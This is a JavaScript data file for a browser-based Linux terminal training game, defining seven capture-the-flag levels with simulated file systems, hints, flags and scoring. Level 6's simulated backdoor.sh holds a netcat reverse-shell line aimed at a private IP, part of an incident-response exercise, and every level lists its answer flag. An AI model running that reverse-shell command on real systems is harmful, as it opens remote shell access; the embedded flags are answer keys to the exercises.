// src/data/levels.js

// Per-level time limits in seconds
export const LEVEL_TIME_LIMITS = {
  1: 80,    // 1 min 20 sec – Basic Navigation
  2: 120,   // 2 min        – Reading Files
  3: 150,   // 2 min 30 sec – Hidden Files
  4: 180,   // 3 min        – Permissions
  5: 200,   // 3 min 20 sec – Searching
  6: 240,   // 4 min        – Log Analysis
  7: 300,   // 5 min        – Final Boss
};

export const LEVELS = [
  {
    id: 1,
    title: "Basic Navigation",
    subtitle: "Find Your Way",
    concepts: ["pwd", "ls", "cd"],
    allowedCommands: ["pwd", "ls", "cd", "submit", "help", "hint", "clear", "history"],
    timeLimitSecs: LEVEL_TIME_LIMITS[1],
    flag: "flag{first_steps_in_linux}",
    hint: "Use 'ls' to list what's in a directory, then 'cd <dirname>' to enter it. The flag is somewhere in /home/player/secrets/",
    mission: "Navigate the file system to find flag.txt hidden in the secrets directory. Use pwd to know where you are, ls to list contents, and cd to move around.",
    pointsAvailable: 60,
    fileSystem: {
      "/home/player": { type: "dir", children: ["documents", "downloads", "secrets"] },
      "/home/player/documents": { type: "dir", children: ["notes.txt"] },
      "/home/player/documents/notes.txt": {
        type: "file",
        content: "Welcome to Terminal Quest!\nThis is your first mission.\nNavigate to the secrets directory to find what you're looking for.\n\nTip: Use 'ls' to list files and 'cd' to change directories.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/downloads": { type: "dir", children: [] },
      "/home/player/secrets": { type: "dir", children: ["flag.txt"] },
      "/home/player/secrets/flag.txt": {
        type: "file", content: "flag{first_steps_in_linux}",
        hidden: false, permissions: "rw-r--r--",
      },
    },
  },

  {
    id: 2,
    title: "Reading Files",
    subtitle: "The Reader's Den",
    concepts: ["cat", "less", "head", "tail"],
    allowedCommands: ["pwd", "ls", "cd", "cat", "less", "more", "head", "tail", "help", "hint", "clear", "history", "submit"],
    timeLimitSecs: LEVEL_TIME_LIMITS[2],
    flag: "flag{file_reader_master}",
    hint: "Read the log file in the logs/ directory. There's a clue inside pointing to where the flag is stored.",
    mission: "A clue is buried in the system logs. Read the log file to discover where the secret flag has been hidden, then navigate there and read it.",
    pointsAvailable: 80,
    fileSystem: {
      "/home/player": { type: "dir", children: ["logs", "backup", "readme.txt"] },
      "/home/player/readme.txt": {
        type: "file",
        content: "SYSTEM NOTICE\n=============\nCheck the logs directory for recent system activity.\nSomething interesting may have been recorded.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/logs": { type: "dir", children: ["system.log", "access.log"] },
      "/home/player/logs/system.log": {
        type: "file",
        content: "[INFO]  System boot sequence initiated\n[INFO]  User 'player' logged in at 09:42:11\n[WARN]  Unusual file access detected\n[INFO]  User stored secret in /backup/hidden.txt\n[INFO]  File transfer complete\n[DEBUG] Process 1337 terminated",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/logs/access.log": {
        type: "file",
        content: "GET /home/player - 200 OK\nGET /home/player/logs - 200 OK\nPOST /secret_upload - 403 FORBIDDEN\nGET /backup - 200 OK",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/backup": { type: "dir", children: ["hidden.txt", "old_config.bak"] },
      "/home/player/backup/hidden.txt": {
        type: "file", content: "flag{file_reader_master}",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/backup/old_config.bak": {
        type: "file",
        content: "# Old Configuration Backup\nhost=localhost\nport=8080\nmax_connections=100\n# This file is no longer in use",
        hidden: false, permissions: "rw-r--r--",
      },
    },
  },

  {
    id: 3,
    title: "Hidden Files",
    subtitle: "What Lies Beneath",
    concepts: ["ls -a"],
    allowedCommands: ["pwd", "ls", "cd", "cat", "less", "more", "head", "tail", "help", "hint", "clear", "history", "submit"],
    timeLimitSecs: LEVEL_TIME_LIMITS[3],
    flag: "flag{hidden_truth_found}",
    hint: "Hidden files in Linux start with a dot (.). Use 'ls -a' to reveal ALL files, including hidden ones.",
    mission: "The flag is hidden from plain sight. Linux hides files that start with a dot. Use 'ls -a' to reveal all hidden files and directories, then navigate to find the flag.",
    pointsAvailable: 80,
    fileSystem: {
      "/home/player": { type: "dir", children: ["public", "workspace", ".secrets", ".config"] },
      "/home/player/public": { type: "dir", children: ["index.html", "decoy.txt"] },
      "/home/player/public/index.html": {
        type: "file", content: "<html>\n<body>\n<p>Nothing to see here. Keep looking.</p>\n</body>\n</html>",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/public/decoy.txt": {
        type: "file", content: "This is NOT the flag. Try harder.\nHint: some things are hidden from plain view.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/workspace": { type: "dir", children: ["project.txt"] },
      "/home/player/workspace/project.txt": {
        type: "file", content: "Project Notes\n=============\nRemember: always check for hidden files before concluding a directory is empty.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/.config": { type: "dir", hidden: true, children: ["settings.conf"] },
      "/home/player/.config/settings.conf": {
        type: "file", hidden: true,
        content: "# System Configuration\ntheme=dark\nversion=1.0\n# Not what you're looking for, but good practice finding hidden dirs!",
        permissions: "rw-r--r--",
      },
      "/home/player/.secrets": { type: "dir", hidden: true, children: ["flag.txt"] },
      "/home/player/.secrets/flag.txt": {
        type: "file", hidden: true, content: "flag{hidden_truth_found}", permissions: "rw-r--r--",
      },
    },
  },

  {
    id: 4,
    title: "Permissions Challenge",
    subtitle: "Access Denied",
    concepts: ["chmod", "ls -l"],
    allowedCommands: ["pwd", "ls", "cd", "cat", "less", "more", "head", "tail", "chmod", "help", "hint", "clear", "history", "submit"],
    timeLimitSecs: LEVEL_TIME_LIMITS[4],
    flag: "flag{permission_granted}",
    hint: "Use 'ls -l' to see file permissions. If a file shows '----------', use 'chmod 644 <filename>' to make it readable.",
    mission: "A flag file exists but you can't read it — permissions have been stripped. Use 'ls -l' to inspect permissions, then 'chmod' to fix them and reveal the flag.",
    pointsAvailable: 100,
    fileSystem: {
      "/home/player": { type: "dir", children: ["secure", "docs", "readme.txt"] },
      "/home/player/readme.txt": {
        type: "file",
        content: "SECURITY NOTICE\n===============\nSomeone has locked down the flag file in the secure/ directory.\nYou'll need to fix the permissions to read it.\n\nUse 'ls -l' to inspect permissions and 'chmod' to change them.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/docs": { type: "dir", children: ["permissions_guide.txt"] },
      "/home/player/docs/permissions_guide.txt": {
        type: "file",
        content: "Linux Permissions Quick Reference\n==================================\nFormat: [type][owner][group][others]\nExample: -rw-r--r--\n\nCommon chmod values:\n  644  = owner read/write, others read-only\n  755  = owner all, others read/execute\n  000  = no permissions (locked!)\n  400  = owner read-only\n\nTo fix a locked file:\n  chmod 644 filename",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/secure": { type: "dir", children: ["flag.txt", "decoy.txt"] },
      "/home/player/secure/flag.txt": {
        type: "file", content: "flag{permission_granted}",
        hidden: false, permissions: "----------", locked: true,
      },
      "/home/player/secure/decoy.txt": {
        type: "file", content: "Not the flag, but you found a readable file!\nThe real flag.txt needs its permissions fixed.",
        hidden: false, permissions: "rw-r--r--",
      },
    },
  },

  {
    id: 5,
    title: "Searching Files",
    subtitle: "Search & Destroy",
    concepts: ["find", "grep"],
    allowedCommands: ["pwd", "ls", "cd", "cat", "less", "more", "head", "tail", "grep", "find", "help", "hint", "clear", "history", "submit"],
    timeLimitSecs: LEVEL_TIME_LIMITS[5],
    flag: "flag{search_and_destroy}",
    hint: "Use 'find /home -name \"*secret*\"' to search by filename, or 'grep \"flag\" <filename>' to search inside a file for the word 'flag'.",
    mission: "The flag is buried among dozens of files. Use 'find' to locate files by name pattern and 'grep' to search inside files for keywords. The needle is in the haystack.",
    pointsAvailable: 120,
    fileSystem: {
      "/home/player": { type: "dir", children: ["data", "logs", "archive"] },
      "/home/player/data": { type: "dir", children: ["file1.txt","file2.txt","file3.txt","secret_data.txt","file4.txt","file5.txt"] },
      "/home/player/data/file1.txt": { type: "file", content: "Lorem ipsum dolor sit amet.\nNot what you're looking for.", hidden: false, permissions: "rw-r--r--" },
      "/home/player/data/file2.txt": { type: "file", content: "System configuration data.\nVersion: 2.1.4\nStatus: Active", hidden: false, permissions: "rw-r--r--" },
      "/home/player/data/file3.txt": { type: "file", content: "Network scan results:\n192.168.1.1 - open\n192.168.1.2 - closed\nNothing suspicious here.", hidden: false, permissions: "rw-r--r--" },
      "/home/player/data/secret_data.txt": {
        type: "file",
        content: "CLASSIFIED DATA\n===============\nOperation: NIGHTFALL\nStatus: ACTIVE\nflag{search_and_destroy}\nDestroy after reading.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/data/file4.txt": { type: "file", content: "User activity report.\nLogin: 08:00\nLogout: 17:30\nNo anomalies detected.", hidden: false, permissions: "rw-r--r--" },
      "/home/player/data/file5.txt": { type: "file", content: "Backup manifest:\n- config.bak\n- users.bak\n- logs.bak\nAll backups verified.", hidden: false, permissions: "rw-r--r--" },
      "/home/player/logs": { type: "dir", children: ["app.log","error.log","debug.log"] },
      "/home/player/logs/app.log": { type: "file", content: "[APP] Service started\n[APP] Request processed: 200 OK\n[APP] User authenticated\n[APP] Session created", hidden: false, permissions: "rw-r--r--" },
      "/home/player/logs/error.log": { type: "file", content: "[ERROR] Connection refused\n[ERROR] Timeout after 30s\n[ERROR] Unauthorized access attempt", hidden: false, permissions: "rw-r--r--" },
      "/home/player/logs/debug.log": { type: "file", content: "[DEBUG] Loading modules...\n[DEBUG] Config parsed\n[DEBUG] Cache initialized\n[DEBUG] Ready", hidden: false, permissions: "rw-r--r--" },
      "/home/player/archive": { type: "dir", children: ["2023.tar.gz.txt","old_flags.txt"] },
      "/home/player/archive/2023.tar.gz.txt": { type: "file", content: "Archive index: 2023 data\nFiles: 1,442\nSize: 2.3GB\nStatus: Compressed", hidden: false, permissions: "rw-r--r--" },
      "/home/player/archive/old_flags.txt": { type: "file", content: "Old competition flags (expired):\nflag{old_flag_1} - EXPIRED\nflag{old_flag_2} - EXPIRED\nflag{old_flag_3} - EXPIRED", hidden: false, permissions: "rw-r--r--" },
    },
  },

  {
    id: 6,
    title: "Log Analysis",
    subtitle: "Incident Response",
    concepts: ["grep", "tail"],
    allowedCommands: ["pwd", "ls", "cd", "cat", "less", "more", "head", "tail", "grep", "find", "help", "hint", "clear", "history", "submit"],
    timeLimitSecs: LEVEL_TIME_LIMITS[6],
    flag: "flag{incident_responder}",
    hint: "Use 'tail logs/auth.log' to see recent events, or 'grep \"attacker\" logs/auth.log' to filter for attacker activity. Follow the trail to find where the backdoor was planted.",
    mission: "A security incident has occurred. Investigate the logs to trace attacker activity, identify the compromised file, and retrieve the flag hidden by the attacker in /tmp/.",
    pointsAvailable: 130,
    fileSystem: {
      "/home/player": { type: "dir", children: ["logs", "tmp", "reports"] },
      "/home/player/logs": { type: "dir", children: ["auth.log","syslog","access.log"] },
      "/home/player/logs/auth.log": {
        type: "file",
        content: "[2024-01-15 02:11:00] Failed login attempt from attacker@192.168.99.1\n[2024-01-15 02:11:03] Failed login attempt from attacker@192.168.99.1\n[2024-01-15 02:11:07] Access granted to user: attacker@192.168.99.1\n[2024-01-15 02:11:09] Privilege escalation attempted\n[2024-01-15 02:11:12] File created: /tmp/backdoor.sh\n[2024-01-15 02:11:15] Access granted to /tmp/backdoor.sh\n[2024-01-15 02:11:20] Connection closed",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/logs/syslog": {
        type: "file",
        content: "[2024-01-15 02:10:55] Kernel: Network interface eth0 up\n[2024-01-15 02:11:00] sshd[1234]: Connection from 192.168.99.1\n[2024-01-15 02:11:12] bash[5678]: /tmp/backdoor.sh created\n[2024-01-15 02:11:18] cron: suspicious task added\n[2024-01-15 02:11:22] netstat: outbound connection 192.168.99.1:4444",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/logs/access.log": {
        type: "file",
        content: "192.168.1.5 - GET /index.html 200\n192.168.1.5 - GET /style.css 200\n192.168.99.1 - POST /admin/upload 403\n192.168.99.1 - GET /etc/passwd 403\n192.168.99.1 - GET /tmp/backdoor.sh 200",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/tmp": { type: "dir", children: ["backdoor.sh","legit_script.sh"] },
      "/home/player/tmp/backdoor.sh": {
        type: "file",
        content: "#!/bin/bash\n# Attacker backdoor — DO NOT EXECUTE\n# Planted by: attacker@192.168.99.1\n\nnc -e /bin/bash 192.168.99.1 4444 &\n\n# You found the compromised file!\nflag{incident_responder}",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/tmp/legit_script.sh": {
        type: "file", content: "#!/bin/bash\n# Legitimate maintenance script\necho 'Running system cleanup...'\nfind /tmp -mtime +7 -delete\necho 'Done.'",
        hidden: false, permissions: "rwxr-xr-x",
      },
      "/home/player/reports": { type: "dir", children: ["template.txt"] },
      "/home/player/reports/template.txt": {
        type: "file",
        content: "INCIDENT REPORT TEMPLATE\n========================\nDate: \nAttacker IP: \nEntry Point: \nFiles Modified: \nRemediation Steps: \n\nTip: Fill this in after you've investigated the logs!",
        hidden: false, permissions: "rw-r--r--",
      },
    },
  },

  {
    id: 7,
    title: "Final Boss",
    subtitle: "The Ultimate Challenge",
    concepts: ["all skills combined"],
    allowedCommands: ["pwd", "ls", "cd", "cat", "less", "more", "head", "tail", "chmod", "grep", "find", "echo", "whoami", "uname", "help", "hint", "clear", "history", "submit"],
    timeLimitSecs: LEVEL_TIME_LIMITS[7],
    flag: "flag{terminal_quest_complete}",
    hint: "This level requires ALL your skills. Start with 'ls -a' to find hidden directories, use 'ls -l' to check permissions, 'grep' the logs for clues, and 'find' to locate the final prize.",
    mission: "The ultimate challenge. Use every skill you've learned: find hidden directories, fix broken permissions, analyse logs to trace the flag's location, and retrieve the final flag to complete Terminal Quest.",
    pointsAvailable: 200,
    fileSystem: {
      "/home/player": { type: "dir", children: ["mission_brief.txt","logs","workspace",".vault"] },
      "/home/player/mission_brief.txt": {
        type: "file",
        content: "FINAL MISSION BRIEF\n===================\nAgent, this is your ultimate test.\n\nStep 1: Find the hidden vault directory\nStep 2: Check what's inside (permissions may be an issue)\nStep 3: Investigate the logs for the access code\nStep 4: Use your skills to retrieve the final flag\n\nGood luck. You'll need it.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/logs": { type: "dir", children: ["mission.log","access.log"] },
      "/home/player/logs/mission.log": {
        type: "file",
        content: "[MISSION] Final objective loaded\n[MISSION] Hidden vault created at /home/player/.vault\n[MISSION] Flag stored in vault/classified/final_flag.txt\n[MISSION] Permissions locked on final_flag.txt\n[MISSION] Use chmod 644 to unlock\n[MISSION] Awaiting agent retrieval...",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/logs/access.log": {
        type: "file",
        content: "[ACCESS] Vault directory sealed\n[ACCESS] File: .vault/classified/final_flag.txt - permissions set to 000\n[ACCESS] Only authorised agents may unlock\n[ACCESS] grep 'flag' after chmod to verify contents",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/workspace": { type: "dir", children: ["tools.txt","cheatsheet.txt"] },
      "/home/player/workspace/tools.txt": {
        type: "file",
        content: "Available Tools for Final Mission\n==================================\nls -a   : reveal hidden files\nls -l   : show permissions\ncd      : navigate directories\ncat     : read file contents\nchmod   : change permissions\ngrep    : search file contents\nfind    : find files by name/pattern\n\nYou have everything you need. Trust your training.",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/workspace/cheatsheet.txt": {
        type: "file",
        content: "QUICK REFERENCE\n===============\nchmod 644 file.txt    - make file readable\nls -la                - list all files with details\nfind . -name '*.txt'  - find all .txt files\ngrep 'flag' file.txt  - search for 'flag' in file\ncat file.txt          - display file contents",
        hidden: false, permissions: "rw-r--r--",
      },
      "/home/player/.vault": { type: "dir", hidden: true, children: ["classified"] },
      "/home/player/.vault/classified": { type: "dir", hidden: true, children: ["final_flag.txt","intel.txt"] },
      "/home/player/.vault/classified/intel.txt": {
        type: "file", hidden: true,
        content: "CLASSIFIED INTEL\n================\nYou've made it this far. The final flag is right here.\nBut first — unlock it with chmod 644 final_flag.txt\nThen cat it to claim your victory.",
        permissions: "rw-r--r--",
      },
      "/home/player/.vault/classified/final_flag.txt": {
        type: "file", hidden: true, content: "flag{terminal_quest_complete}",
        permissions: "----------", locked: true,
      },
    },
  },
];

export const SCORING = {
  correctCommand: 5,
  findClue: 10,
  findFlag: 50,
  completeLevel: 100,
  wrongCommand: -2,
  hintUsage: -10,
  timeExpiredPenalty: -20,
};
